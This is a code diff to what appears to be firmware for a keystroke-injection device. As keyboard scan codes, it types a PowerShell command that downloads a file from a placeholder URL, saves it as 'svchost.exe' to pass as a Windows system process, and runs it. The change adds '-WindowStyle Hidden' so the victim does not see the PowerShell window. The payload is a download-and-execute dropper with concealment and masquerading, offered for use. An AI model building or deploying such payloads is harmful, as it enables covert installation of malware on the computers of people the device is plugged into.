@@ -56,8 +56,8 @@ namespace keyboard {
 }
 
 
-// powershell
-const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15};
+// powershell -WindowStyle Hidden
+const uint8_t key_arr_0[] PROGMEM = {0,19, 0,18, 0,26, 0,8, 0,21, 0,22, 0,11, 0,8, 0,15, 0,15, 0,44, 0,45, 2,26, 0,12, 0,17, 0,7, 0,18, 0,26, 2,22, 0,23, 0,28, 0,15, 0,8, 0,44, 2,11, 0,12, 0,7, 0,7, 0,8, 0,17};
 // iwr -Uri "URL_HERE" -OutFile "svchost.exe"
 const uint8_t key_arr_1[] PROGMEM = {0,12, 0,26, 0,21, 0,44, 0,45, 2,24, 0,21, 0,12, 0,44, 2,52, 2,24, 2,21, 2,15, 2,45, 2,11, 2,8, 2,21, 2,8, 2,52, 0,44, 0,45, 2,18, 0,24, 0,23, 2,9, 0,12, 0,15, 0,8, 0,44, 2,52, 0,22, 0,25, 0,6, 0,11, 0,18, 0,22, 0,23, 0,55, 0,8, 0,27, 0,8, 2,52};
 // ./svchost.exe
@@ -81,7 +81,7 @@ void setup() {
     delay(1);
     delay(500); // DELAY 500
     delay(1);
-    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell
+    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING powershell -WindowStyle Hidden
     delay(1);
     keyboard::type(40, 0, 0, 0, 0, 0, 0); // ENTER
     delay(1);
